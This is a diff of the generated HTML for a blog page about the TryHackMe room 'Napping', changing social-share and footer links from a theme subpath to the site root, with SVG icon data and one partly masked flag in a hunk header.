                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on facebook"
-        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f">
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on whatsapp"
-        href="https://api.whatsapp.com/send?text=Napping%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f">
+        href="https://api.whatsapp.com/send?text=Napping%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
         </svg>
     </a>
     <a target="_blank" rel="noopener noreferrer" aria-label="share Napping - THM on telegram"
-        href="https://telegram.me/share/url?text=Napping%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fnapping%2f">
+        href="https://telegram.me/share/url?text=Napping%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fposts%2fnapping%2f">
         <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
             <path
                 d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -690,7 +702,7 @@ THM{Adm1n$__******tsk_tSK}
     </main>
     
 <footer class="footer">
-    <span>&copy; 2023 <a href="https://sh3bu.github.io/themes/hugo-PaperMod">Shebu 🔽</a></span>
+    <span>&copy; 2023 <a href="https://sh3bu.github.io/">Shebu</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
